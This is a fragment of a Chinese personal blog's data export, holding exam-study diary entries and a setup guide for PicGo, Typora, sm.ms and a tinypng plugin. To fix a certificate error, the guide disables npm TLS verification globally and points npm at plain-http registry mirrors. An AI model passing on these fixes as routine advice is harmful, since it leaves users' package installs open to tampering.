data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\"\n                         alt=\"IMG_2889\" style=\"zoom: 33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-7\"><a href=\"#5-7\" class=\"headerlink\" title=\"5.7\"></a>5.7</h2><p>今天学习状态貌似还不错？</p>\n<h3 id=\"Math-1\"><a href=\"#Math-1\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第9讲完结 p186</li>\n</ul>\n<p>第九讲算是开始了计算之旅，有很多没有想到的方法，感觉这个东西是个熟能生巧的事情，希望后面多刷题，练练脑子，题目越学写越快吧</p>\n<h3 id=\"English-1\"><a href=\"#English-1\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>记单词 50个</li>\n</ul>\n<p>目前想法是每天早上记半个小时，然后晚上吃饭回来休息的时候记半个小时，暂定这样吧</p>\n<h3 id=\"408-1\"><a href=\"#408-1\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>二叉树遍历刚学 p145</li>\n</ul>\n<p>感觉408比数一简单些？也许是我的错觉，但感觉408越学越有意思了？</p>\n<p>感觉都是一些概念性的东西偏多，可以多做一些小程序的选择题</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\"\n                         style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n<h2 id=\"5-8\"><a href=\"#5-8\" class=\"headerlink\" title=\"5.8\"></a>5.8</h2><p>感觉今天状态更好了？除了早上iscc第二周刚开始，要一直速度交flag，下午才来的图书馆，状态还行，wjh下午也来了,希望能够坚持下去吧，今天终于记单词了！</p>\n<h3 id=\"Math-2\"><a href=\"#Math-2\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第九讲计算重温了一下</li>\n<li>第十讲开了个头 p190</li>\n</ul>\n<h3 id=\"English-2\"><a href=\"#English-2\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>记了50个单词加油。。。</li>\n</ul>\n<h3 id=\"408-2\"><a href=\"#408-2\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>二叉树5.3视频看完，题未写完 p155</li>\n</ul>\n<p>感觉二叉树的遍历还需要多啃一啃 感觉挺好玩的，看看晚上能不能把剩下的题写完</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\"\n                         alt=\"IMG_2897\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-9\"><a href=\"#5-9\" class=\"headerlink\" title=\"5.9\"></a>5.9</h2><p>今天过的也是比较充实，比较欣慰的一点是，开始记单词了（终于</p>\n<p>中午和好朋友在家里吃了自己蒸的生蚝，就是差一点蒜蓉酱，互相谈论了一下考研，</p>\n<p>能坚持下来就是成功！也就辛苦最后8个月！</p>\n<h3 id=\"Math-3\"><a href=\"#Math-3\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第十讲看完，题未做 p200</li>\n<li>准备明天把前十讲题目做完</li>\n</ul>\n<p>最近越发感觉到了计算量，很多题都没思路，但刷了一些题后，感觉好多了</p>\n<p>感觉就是个熟能生巧的事情后期多刷一点题目吧</p>\n<h3 id=\"English-3\"><a href=\"#English-3\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>60+52 &#x2F;43min</li>\n</ul>\n<p>也算是开始好起来了呀，后期预计每天花1h+，学习100+复习100</p>\n<h3 id=\"408-3\"><a href=\"#408-3\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>树，森林 学完，题未做完 p183</li>\n</ul>\n<p>感觉数据结构，学起来挺有意思，蛮喜欢推理的过程，坚持下去！</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\"\n                         alt=\"IMG_2901\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-10\"><a href=\"#5-10\" class=\"headerlink\" title=\"5.10\"></a>5.10</h2><p>今天只学了半天吧，感觉状态一般般吧，希望能延续下去</p>\n<h3 id=\"Math-4\"><a href=\"#Math-4\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>将前面的题目都复现了一下</li>\n</ul>\n<p>狠狠的刷题，狠狠的总结</p>\n<h3 id=\"English-4\"><a href=\"#English-4\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>记单词</li>\n</ul>\n<p>记单词，坚持下去吧！</p>\n<h3 id=\"408-4\"><a href=\"#408-4\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>没复习（我的错！！）</li>\n</ul>\n<p>总的来说就是，今天因为项目管理的实验，干扰了我的计划呜呜，明天一定坚持下来</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\"\n                         alt=\"IMG_2913\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-11\"><a href=\"#5-11\" class=\"headerlink\" title=\"5.11\"></a>5.11</h2><ul>\n<li>喝了人生中的第一杯星巴克</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG\"\n                        alt=\"IMG_2925(1)\"\n                 ></p>\n<ul>\n<li>ktv爽唱四小时</li>\n</ul>\n<h2 id=\"5-12\"><a href=\"#5-12\" class=\"headerlink\" title=\"5.12\"></a>5.12</h2><p>今天去参加湖北省信创，题目比较简单，第三名拿下了金奖</p>\n<p>web发挥的不错，两个靶机全部解出来了</p>\n<p>后期好好学习一下批量脚本利用，放一些照片吧</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg\"\n                        alt=\"Xnip2024-05-12_12-42-33\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg\"\n                        alt=\"4e462780ed0f89e5da35f90564ba25be\"\n                 ></p>\n<p>后续要好好认真复习了，还有期末考试的内容，速成吧…</p>\n<h2 id=\"5-13\"><a href=\"#5-13\" class=\"headerlink\" title=\"5.13\"></a>5.13</h2><p>今天复习了软件测试和算法，突然一下子感觉算法也没有那么难？？</p>\n<p>可能是那个老师讲的太好了</p>\n"},{"title":"picgo+typora+sm.ms+tinypng配置","date":"2024-05-13T19:01:11.000Z","excerpt":"picgo+typora+sm.ms+tinypng配置","_content":"\n\n\n# picgo+typora+sm.ms+tinypng配置\n\n\n\n## 引言\n\n由于最近感觉github图床访问速度太慢，于是换成了sm.ms感觉会好一些，但是sm.ms\n\n图床有大小限制，于是弄了个自动压缩的插件，下面是我在配置的过程中踩到的一些坑，记录了下来\n\n\n\n## typora配置\n\n在偏好设置里面配置如下\n\n![image-20240514023823816](https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png)\n\n\n\n## picgo配置\n\n**下载链接**：https://github.com/PicGo\n\n在PicGo中配置服务API Token，如果你是SM.MS服务就配置SMMS的token，如果是阿里云OSS的服务就配置阿里云的token（token就是上面第2个文章标题下生成的API Token）\n\n![image-20240514024315478](https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png)\n\n## sm.ms配置\n\nSMMS图床分海外和国内，如果海外访问不了，可以通过国内进行注册申请\n\n海外网址：[https://sm.ms/](https://link.zhihu.com/?target=https%3A//sm.ms/)\n\n国内网址：https://smms.app/\n\n![image-20240514024117130](https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png)\n\n\n\n\n\n\n\n点击Sign Up进行SMMS的账号注册\n\n![image-20240514024152185](https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png)\n\n\n\n\n\n### 获取Token密钥（后面图片上传需要用）\n\n登录SMMS系统，找到用户信息，选择API Token，点击Generate Secret Token生成token\n\n![image-20240514024251486](https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png)\n\n\n\n## tinypng配置\n\n这里要在picgo下载一个插件tinypng（**这里划重点， 后面踩了很多坑，划重点！**）\n\n![image-20240514024652599](https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png)\n\n![image-20240514024935584](https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png)\n\n\n\n将api填入设置中就行\n\n\n\n\n\n## 踩坑！\n\n### \n\n### picgo软件可能会打不开\n\n```\nsudo xattr -d com.apple.quarantine \"/Applications/PicGo.app\"\n```\n\n运行即可打开\n\n\n\n```\nnpm install picgo -g\n```\n\n```\n\n\n安装 picgo add compress\n\n选择使用 picgo use transformer\n\n参数配置 picgo config plugin compress\n```\n\ncompress 选择压缩工具 默认选项\n\n- [tinypng](https://tinypng.com/) 无损压缩，需要上传到 tinypng\n- [imagemin](https://github.com/imagemin/imagemin) 压缩过程不需要经过网络，但是图片会有损耗\n- image2webp 本地有损压缩，支持 GIF 格式有损压缩 注意：有些图床（比如 sm.ms）不支持 webp 图片格式，会上传失败\n\n![image-20240514025424708](https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png)\n\n\n\n### **reason: certificate has expired 错误**\n\n![image-20240514025542618](https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png)\n\n\n\n解决方法\n\n```\n1、取消ssl验证：\n \nnpm config set strict-ssl false\n \n这个方法一般就可以解决了。\n \n \n2、更换npm镜像源：\n \nnpm config set registry http://registry.cnpmjs.org\nnpm config set registry http://registry.npm.taobao.org\n \n```\n\n\n\n\n\n### 安装gui插件\n\n```\nnpm install picgo -g\nnpm install ./picgo-plugin-<your-plugin-name>\n```\n\nelectron版的PicGo配置文件的路径在不同的系统里是不同的：\n\n- Windows: `%APPDATA%\\picgo\\data.json`\n- Linux: `$XDG_CONFIG_HOME/picgo/data.json` or `~/.config/picgo/data.json`\n- macOS: `~/Library/Application\\ Support/picgo/data.json`\n\n举例，在windows里你可以在：\n\n`C:\\Users\\你的用户名\\AppData\\Roaming\\picgo\\data.json`找到它。\n\n在linux里你可以在：\n\n`~/.config/picgo/data.json`里找到它。\n\nmacOS同理。\n\n此时你的插件目录比如在 `/usr/home/picgo-plugin-<your-plugin-name>`里，\n\n在PicGo默认配置文件所在的目录下，输入：\n\n```\nnpm install /usr/home/picgo-plugin-<your-plugin-name>\n```\n\n\n\n### 插件下载失败\n\n\n\n**tingpng**地址：https://github.com/liujinpen/picgo-plugin-compress-tinypng\n\n\n\n开梯子没用，放弃直接安装的方式，采用npm方式安装\n\n我用的Mac，picgo路径如下： /Users/cunyu/Library/Application Support/picgo（自己参照）\n\n解决方法： 首先，cd到这个路径下 然后Mac要安装一些插件，命令如下：\n\n```\nbrew install libtool automake autoconf nasm\n```\n\n​    \n\n这个过程可能要很久，建议开梯子或有homebrew源\n\n**下面正式开始安装**\n\n第一步：清理缓存\n\n```\nnpm cache clean --force\n```\n\n​    \n\n第二步：删除文件夹\n\n把整个node_modules都删除\n\n第三步：install一下\n\n```\nnpm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org\n```\n\n​      \n\n第四步：\n\n```\nnpm install --registry=https://registry.npm.taobao.org\n```\n\n\n\n\n\n在命令行找不到目录的记得对中间的空格用反斜杠转义一下。或者打印号\n\n```\ncd \"Application Support\"\ncd Application/Support\n```\n\n","source":"_posts/picgo+typora+sm.ms+tinypng配置.md","raw":"---\ntitle: picgo+typora+sm.ms+tinypng配置\ndate: 2024-05-14 03:01:11\nexcerpt: picgo+typora+sm.ms+tinypng配置\ncategories: 杂谈\n---\n\n\n\n# picgo+typora+sm.ms+tinypng配置\n\n\n\n## 引言\n\n由于最近感觉github图床访问速度太慢，于是换成了sm.ms感觉会好一些，但是sm.ms\n\n图床有大小限制，于是弄了个自动压缩的插件，下面是我在配置的过程中踩到的一些坑，记录了下来\n\n\n\n## typora配置\n\n在偏好设置里面配置如下\n\n![image-20240514023823816](https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png)\n\n\n\n## picgo配置\n\n**下载链接**：https://github.com/PicGo\n\n在PicGo中配置服务API Token，如果你是SM.MS服务就配置SMMS的token，如果是阿里云OSS的服务就配置阿里云的token（token就是上面第2个文章标题下生成的API Token）\n\n![image-20240514024315478](https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png)\n\n## sm.ms配置\n\nSMMS图床分海外和国内，如果海外访问不了，可以通过国内进行注册申请\n\n海外网址：[https://sm.ms/](https://link.zhihu.com/?target=https%3A//sm.ms/)\n\n国内网址：https://smms.app/\n\n![image-20240514024117130](https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png)\n\n\n\n\n\n\n\n点击Sign Up进行SMMS的账号注册\n\n![image-20240514024152185](https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png)\n\n\n\n\n\n### 获取Token密钥（后面图片上传需要用）\n\n登录SMMS系统，找到用户信息，选择API Token，点击Generate Secret Token生成token\n\n![image-20240514024251486](https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png)\n\n\n\n## tinypng配置\n\n这里要在picgo下载一个插件tinypng（**这里划重点， 后面踩了很多坑，划重点！**）\n\n![image-20240514024652599](https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png)\n\n![image-20240514024935584](https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png)\n\n\n\n将api填入设置中就行\n\n\n\n\n\n## 踩坑！\n\n### \n\n### picgo软件可能会打不开\n\n```\nsudo xattr -d com.apple.quarantine \"/Applications/PicGo.app\"\n```\n\n运行即可打开\n\n\n\n```\nnpm install picgo -g\n```\n\n```\n\n\n安装 picgo add compress\n\n选择使用 picgo use transformer\n\n参数配置 picgo config plugin compress\n```\n\ncompress 选择压缩工具 默认选项\n\n- [tinypng](https://tinypng.com/) 无损压缩，需要上传到 tinypng\n- [imagemin](https://github.com/imagemin/imagemin) 压缩过程不需要经过网络，但是图片会有损耗\n- image2webp 本地有损压缩，支持 GIF 格式有损压缩 注意：有些图床（比如 sm.ms）不支持 webp 图片格式，会上传失败\n\n![image-20240514025424708](https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png)\n\n\n\n### **reason: certificate has expired 错误**\n\n![image-20240514025542618](https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png)\n\n\n\n解决方法\n\n```\n1、取消ssl验证：\n \nnpm config set strict-ssl false\n \n这个方法一般就可以解决了。\n \n \n2、更换npm镜像源：\n \nnpm config set registry http://registry.cnpmjs.org\nnpm config set registry http://registry.npm.taobao.org\n \n```\n\n\n\n\n\n### 安装gui插件\n\n```\nnpm install picgo -g\nnpm install ./picgo-plugin-<your-plugin-name>\n```\n\nelectron版的PicGo配置文件的路径在不同的系统里是不同的：\n\n- Windows: `%APPDATA%\\picgo\\data.json`\n- Linux: `$XDG_CONFIG_HOME/picgo/data.json` or `~/.config/picgo/data.json`\n- macOS: `~/Library/Application\\ Support/picgo/data.json`\n\n举例，在windows里你可以在：\n\n`C:\\Users\\你的用户名\\AppData\\Roaming\\picgo\\data.json`找到它。\n\n在linux里你可以在：\n\n`~/.config/picgo/data.json`里找到它。\n\nmacOS同理。\n\n此时你的插件目录比如在 `/usr/home/picgo-plugin-<your-plugin-name>`里，\n\n在PicGo默认配置文件所在的目录下，输入：\n\n```\nnpm install /usr/home/picgo-plugin-<your-plugin-name>\n```\n\n\n\n### 插件下载失败\n\n\n\n**tingpng**地址：https://github.com/liujinpen/picgo-plugin-compress-tinypng\n\n\n\n开梯子没用，放弃直接安装的方式，采用npm方式安装\n\n我用的Mac，picgo路径如下： /Users/cunyu/Library/Application Support/picgo（自己参照）\n\n解决方法： 首先，cd到这个路径下 然后Mac要安装一些插件，命令如下：\n\n```\nbrew install libtool automake autoconf nasm\n```\n\n​    \n\n这个过程可能要很久，建议开梯子或有homebrew源\n\n**下面正式开始安装**\n\n第一步：清理缓存\n\n```\nnpm cache clean --force\n```\n\n​    \n\n第二步：删除文件夹\n\n把整个node_modules都删除\n\n第三步：install一下\n\n```\nnpm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org\n```\n\n​      \n\n第四步：\n\n```\nnpm install --registry=https://registry.npm.taobao.org\n```\n\n\n\n\n\n在命令行找不到目录的记得对中间的空格用反斜杠转义一下。或者打印号\n\n```\ncd \"Application Support\"\ncd Application/Support\n```\n\n","slug":"picgo+typora+sm.ms+tinypng配置","published":1,"updated":"2024-05-13T19:03:33.581Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clw5c18lb00003j767dr1gvht","content":"<h1 id=\"picgo-typora-sm-ms-tinypng配置\"><a href=\"#picgo-typora-sm-ms-tinypng配置\" class=\"headerlink\" title=\"picgo+typora+sm.ms+tinypng配置\"></a>picgo+typora+sm.ms+tinypng配置</h1><h2 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h2><p>由于最近感觉github图床访问速度太慢，于是换成了sm.ms感觉会好一些，但是sm.ms</p>\n<p>图床有大小限制，于是弄了个自动压缩的插件，下面是我在配置的过程中踩到的一些坑，记录了下来</p>\n<h2 id=\"typora配置\"><a href=\"#typora配置\" class=\"headerlink\" title=\"typora配置\"></a>typora配置</h2><p>在偏好设置里面配置如下</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png\"\n                        alt=\"image-20240514023823816\"\n                 ></p>\n<h2 id=\"picgo配置\"><a href=\"#picgo配置\" class=\"headerlink\" title=\"picgo配置\"></a>picgo配置</h2><p><strong>下载链接</strong>：<a class=\"link\"   href=\"https://github.com/PicGo\" >https://github.com/PicGo<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>在PicGo中配置服务API Token，如果你是SM.MS服务就配置SMMS的token，如果是阿里云OSS的服务就配置阿里云的token（token就是上面第2个文章标题下生成的API Token）</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png\"\n                        alt=\"image-20240514024315478\"\n                 ></p>\n<h2 id=\"sm-ms配置\"><a href=\"#sm-ms配置\" class=\"headerlink\" title=\"sm.ms配置\"></a>sm.ms配置</h2><p>SMMS图床分海外和国内，如果海外访问不了，可以通过国内进行注册申请</p>\n<p>海外网址：<a class=\"link\"   href=\"https://link.zhihu.com/?target=https://sm.ms/\" >https://sm.ms/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>国内网址：<a class=\"link\"   href=\"https://smms.app/\" >https://smms.app/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png\"\n                        alt=\"image-20240514024117130\"\n                 ></p>\n<p>点击Sign Up进行SMMS的账号注册</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png\"\n                        alt=\"image-20240514024152185\"\n                 ></p>\n<h3 id=\"获取Token密钥（后面图片上传需要用）\"><a href=\"#获取Token密钥（后面图片上传需要用）\" class=\"headerlink\" title=\"获取Token密钥（后面图片上传需要用）\"></a>获取Token密钥（后面图片上传需要用）</h3><p>登录SMMS系统，找到用户信息，选择API Token，点击Generate Secret Token生成token</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png\"\n                        alt=\"image-20240514024251486\"\n                 ></p>\n<h2 id=\"tinypng配置\"><a href=\"#tinypng配置\" class=\"headerlink\" title=\"tinypng配置\"></a>tinypng配置</h2><p>这里要在picgo下载一个插件tinypng（<strong>这里划重点， 后面踩了很多坑，划重点！</strong>）</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png\"\n                        alt=\"image-20240514024652599\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png\"\n                        alt=\"image-20240514024935584\"\n                 ></p>\n<p>将api填入设置中就行</p>\n<h2 id=\"踩坑！\"><a href=\"#踩坑！\" class=\"headerlink\" title=\"踩坑！\"></a>踩坑！</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"picgo软件可能会打不开\"><a href=\"#picgo软件可能会打不开\" class=\"headerlink\" title=\"picgo软件可能会打不开\"></a>picgo软件可能会打不开</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo xattr -d com.apple.quarantine &quot;/Applications/PicGo.app&quot;</span><br></pre></td></tr></table></figure>\n\n<p>运行即可打开</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">安装 picgo add compress</span><br><span class=\"line\"></span><br><span class=\"line\">选择使用 picgo use transformer</span><br><span class=\"line\"></span><br><span class=\"line\">参数配置 picgo config plugin compress</span><br></pre></td></tr></table></figure>\n\n<p>compress 选择压缩工具 默认选项</p>\n<ul>\n<li><a class=\"link\"   href=\"https://tinypng.com/\" >tinypng<i class=\"fas fa-external-link-alt\"></i></a> 无损压缩，需要上传到 tinypng</li>\n<li><a class=\"link\"   href=\"https://github.com/imagemin/imagemin\" >imagemin<i class=\"fas fa-external-link-alt\"></i></a> 压缩过程不需要经过网络，但是图片会有损耗</li>\n<li>image2webp 本地有损压缩，支持 GIF 格式有损压缩 注意：有些图床（比如 sm.ms）不支持 webp 图片格式，会上传失败</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png\"\n                        alt=\"image-20240514025424708\"\n                 ></p>\n<h3 id=\"reason-certificate-has-expired-错误\"><a href=\"#reason-certificate-has-expired-错误\" class=\"headerlink\" title=\"reason: certificate has expired 错误\"></a><strong>reason: certificate has expired 错误</strong></h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png\"\n                        alt=\"image-20240514025542618\"\n                 ></p>\n<p>解决方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、取消ssl验证：</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set strict-ssl false</span><br><span class=\"line\"> </span><br><span class=\"line\">这个方法一般就可以解决了。</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">2、更换npm镜像源：</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set registry http://registry.cnpmjs.org</span><br><span class=\"line\">npm config set registry http://registry.npm.taobao.org</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"安装gui插件\"><a href=\"#安装gui插件\" class=\"headerlink\" title=\"安装gui插件\"></a>安装gui插件</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br><span class=\"line\">npm install ./picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n<p>electron版的PicGo配置文件的路径在不同的系统里是不同的：</p>\n<ul>\n<li>Windows: <code>%APPDATA%\\picgo\\data.json</code></li>\n<li>Linux: <code>$XDG_CONFIG_HOME/picgo/data.json</code> or <code>~/.config/picgo/data.json</code></li>\n<li>macOS: <code>~/Library/Application\\ Support/picgo/data.json</code></li>\n</ul>\n<p>举例，在windows里你可以在：</p>\n<p><code>C:\\Users\\你的用户名\\AppData\\Roaming\\picgo\\data.json</code>找到它。</p>\n<p>在linux里你可以在：</p>\n<p><code>~/.config/picgo/data.json</code>里找到它。</p>\n<p>macOS同理。</p>\n<p>此时你的插件目录比如在 <code>/usr/home/picgo-plugin-&lt;your-plugin-name&gt;</code>里，</p>\n<p>在PicGo默认配置文件所在的目录下，输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install /usr/home/picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"插件下载失败\"><a href=\"#插件下载失败\" class=\"headerlink\" title=\"插件下载失败\"></a>插件下载失败</h3><p><strong>tingpng</strong>地址：<a class=\"link\"   href=\"https://github.com/liujinpen/picgo-plugin-compress-tinypng\" >https://github.com/liujinpen/picgo-plugin-compress-tinypng<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>开梯子没用，放弃直接安装的方式，采用npm方式安装</p>\n<p>我用的Mac，picgo路径如下： &#x2F;Users&#x2F;cunyu&#x2F;Library&#x2F;Application Support&#x2F;picgo（自己参照）</p>\n<p>解决方法： 首先，cd到这个路径下 然后Mac要安装一些插件，命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install libtool automake autoconf nasm</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>这个过程可能要很久，建议开梯子或有homebrew源</p>\n<p><strong>下面正式开始安装</strong></p>\n<p>第一步：清理缓存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm cache clean --force</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>第二步：删除文件夹</p>\n<p>把整个node_modules都删除</p>\n<p>第三步：install一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>​      </p>\n<p>第四步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>在命令行找不到目录的记得对中间的空格用反斜杠转义一下。或者打印号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd &quot;Application Support&quot;</span><br><span class=\"line\">cd Application/Support</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"picgo-typora-sm-ms-tinypng配置\"><a href=\"#picgo-typora-sm-ms-tinypng配置\" class=\"headerlink\" 